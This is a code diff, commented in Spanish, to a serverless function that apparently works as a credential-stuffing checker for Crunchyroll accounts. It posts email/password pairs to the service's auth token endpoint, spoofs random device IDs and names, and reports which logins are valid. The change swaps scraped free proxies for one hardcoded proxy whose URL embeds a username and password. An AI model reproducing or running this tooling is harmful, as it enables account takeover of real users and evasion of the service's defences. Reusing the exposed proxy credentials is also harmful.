@@ -23,24 +23,9 @@ exports.handler = async (event) => {
             const randomDeviceId = crypto.randomBytes(16).toString('hex');
             const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
 
-            // === BUSCAMOS PROXIES FRESCOS EN TIEMPO REAL ===
-            let proxyUrl = null;
-            try {
-                // Le pedimos a ProxyScrape 20 proxies HTTP vivos
-                const proxyApi = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all', { timeout: 5000 });
-                const proxyList = proxyApi.data.split('\r\n').filter(p => p.trim() !== '');
-                
-                if (proxyList.length > 0) {
-                    // Elegimos uno al azar de la lista que acabamos de bajar
-                    const randomProxy = proxyList[Math.floor(Math.random() * proxyList.length)];
-                    proxyUrl = 'http://' + randomProxy;
-                }
-            } catch (e) {
-                console.log("Error bajando proxies frescos, intentando sin proxy...");
-            }
-
-            // Si conseguimos proxy, lo usamos. Si no, va directo (y probablemente falle).
-            const agent = proxyUrl ? new HttpsProxyAgent(proxyUrl) : undefined;
+            // EL PROXY GANADOR
+            const proxyUrl = 'http://poxweudy:pvma7be69xzy@45.38.107.97:6014'; 
+            const agent = new HttpsProxyAgent(proxyUrl);
 
             try {
                 const res = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
@@ -71,7 +56,7 @@ exports.handler = async (event) => {
                     results.push({ email, valid: false, reason: 'Credenciales inválidas' });
                 }
             } catch (err) {
-                results.push({ email, valid: false, reason: 'Error: ' + (err.response ? err.response.status : err.message) });
+                results.push({ email, valid: false, reason: 'Error Proxy/Crunchy: ' + (err.response ? err.response.status : err.message) });
             }
         }
         return { statusCode: 200, headers, body: JSON.stringify({ results }) };
